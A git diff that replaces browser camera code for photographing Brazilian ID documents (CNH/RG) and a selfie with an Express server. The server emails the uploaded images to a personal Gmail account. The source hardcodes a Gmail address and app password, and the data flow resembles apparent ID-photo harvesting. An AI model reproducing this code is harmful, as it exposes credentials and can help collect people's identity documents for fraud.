@@ -1,134 +1,77 @@
-const documentStep = document.getElementById("documentStep");
-const chooseCNH = document.getElementById("chooseCNH");
-const chooseRG = document.getElementById("chooseRG");
-const photoForm = document.getElementById("photoForm");
-const photoTypeSelect = document.getElementById("photoType");
+const express = require("express");
+const multer = require("multer");
+const nodemailer = require("nodemailer");
+const fs = require("fs");
+const path = require("path");
 
-const captureButton = document.getElementById("capture");
-const canvas = document.getElementById("snapshot");
-const context = canvas.getContext("2d");
-const photos = {};
+const app = express();
+const upload = multer({ dest: "uploads/" });
 
-const photoOptions = {
-  CNH: [
-    { value: "identityFront", text: "CNH (Frente)" },
-    { value: "selfie", text: "Selfie" },
-  ],
-  RG: [
-    { value: "identityFront", text: "RG (Frente)" },
-    { value: "identityBack", text: "RG (Verso)" },
-    { value: "selfie", text: "Selfie" },
-  ],
-};
+const EMAIL = "saresende5555@gmail.com"; 
+const PASSWORD = "nlaa nylc ddic dhmy";
 
-let currentStream = null;
-
-function updatePhotoOptions(options) {
-  photoTypeSelect.innerHTML = "";
-  options.forEach((option) => {
-    const opt = document.createElement("option");
-    opt.value = option.value;
-    opt.textContent = option.text;
-    photoTypeSelect.appendChild(opt);
-  });
-}
-
-function updatePhotoOptions(options) {
-  console.log("Atualizando opções de foto:", options); // LOG
-  photoTypeSelect.innerHTML = "";
-  options.forEach((option) => {
-    const opt = document.createElement("option");
-    opt.value = option.value;
-    opt.textContent = option.text;
-    photoTypeSelect.appendChild(opt);
-  });
-}
-
-// Iniciar câmera
-async function startCamera(facingMode = "environment") {
-  const video = document.getElementById("camera");
-  if (currentStream) {
-    currentStream.getTracks().forEach((track) => track.stop());
-  }
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode },
-    });
-    video.srcObject = stream;
-    currentStream = stream;
-  } catch (err) {
-    console.error("Erro ao acessar a câmera:", err); // LOG
-    alert("Erro ao acessar a câmera: " + err.message + " (" + err.name + ")");
-  }
-}
-
-// Atualizar o contorno da sobreposição
-function updateOverlay(type) {
-  console.log("Atualizando sobreposição para:", type); // LOG
-  const overlay = document.getElementById("overlay");
-  overlay.className = ""; // Remove todas as classes existentes
-  if (type === "selfie") {
-    overlay.classList.add("overlay", "oval");
-  } else {
-    overlay.classList.add("overlay", "rectangle");
-  }
-}
-
-// Eventos ao clicar nos botões CNH e RG
-chooseCNH.addEventListener("click", () => {
-  console.log("Botão CNH clicado"); // LOG
-  documentStep.style.display = "none";
-  photoForm.style.display = "block";
-  updatePhotoOptions(photoOptions.CNH);
-  startCamera("environment");
-  updateOverlay(photoTypeSelect.value);
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: EMAIL,
+    pass: PASSWORD,
+  },
 });
 
-chooseRG.addEventListener("click", () => {
-  console.log("Botão RG clicado"); // LOG
-  documentStep.style.display = "none";
-  photoForm.style.display = "block";
-  updatePhotoOptions(photoOptions.RG);
-  startCamera("environment");
-  updateOverlay(photoTypeSelect.value);
-});
+app.use(express.static("public"));
 
-// Alterar câmera com base no tipo de foto selecionado
-photoTypeSelect.addEventListener("change", () => {
-  const selectedOption = photoTypeSelect.value;
-  console.log("Tipo de foto selecionado:", selectedOption); // LOG
-  if (selectedOption === "selfie") {
-    startCamera("user");
-  } else {
-    startCamera("environment");
-  }
-  updateOverlay(selectedOption);
-});
+app.post(
+  "/upload",
+  upload.fields([
+    { name: "frontPhoto", maxCount: 1 },
+    { name: "backPhoto", maxCount: 1 },
+    { name: "selfiePhoto", maxCount: 1 },
+  ]),
+  async (req, res) => {
+    try {
+      const { frontPhoto, backPhoto, selfiePhoto } = req.files;
 
-captureButton.addEventListener("click", () => {
-  const video = document.getElementById("camera");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const image = canvas.toDataURL("image/png");
-  const photoType = photoTypeSelect.value;
-  photos[photoType] = image;
-  alert(`Foto ${photoType} capturada com sucesso!`);
-});
+      if (!frontPhoto || !backPhoto || !selfiePhoto) {
+        return res.status(400).send("Todas as fotos são obrigatórias.");
+      }
 
-photoForm.addEventListener("submit", async function (e) {
-  e.preventDefault();
-  const formData = new FormData();
-  for (const type in photos) {
-    const imageBlob = await fetch(photos[type]).then((res) => res.blob());
-    formData.append(type, imageBlob, `${type}.png`);
+      const attachments = [
+        {
+          filename: frontPhoto[0].originalname,
+          path: frontPhoto[0].path,
+        },
+        {
+          filename: backPhoto[0].originalname,
+          path: backPhoto[0].path,
+        },
+        {
+          filename: selfiePhoto[0].originalname,
+          path: selfiePhoto[0].path,
+        },
+      ];
+
+      const mailOptions = {
+        from: EMAIL,
+        to: "saresende555@gmail.com",
+        subject: "Novas fotos enviadas",
+        text: "As fotos foram enviadas com sucesso!",
+        attachments,
+      };
+
+      await transporter.sendMail(mailOptions);
+
+      
+      attachments.forEach((file) => fs.unlinkSync(file.path));
+
+      res.send("Fotos enviadas com sucesso!");
+    } catch (error) {
+      console.error("Erro ao processar o upload:", error);
+      res.status(500).send("Erro ao enviar as fotos.");
+    }
   }
-  try {
-    const response = await fetch("/upload", { method: "POST", body: formData });
-    alert(
-      response.ok ? "Fotos enviadas com sucesso!" : "Erro ao enviar as fotos."
-    );
-  } catch (error) {
-    alert("Erro ao enviar as fotos.");
-  }
+);
+
+const PORT = 3000;
+app.listen(PORT, () => {
+  console.log(`Servidor rodando em http://localhost:${PORT}`);
 });
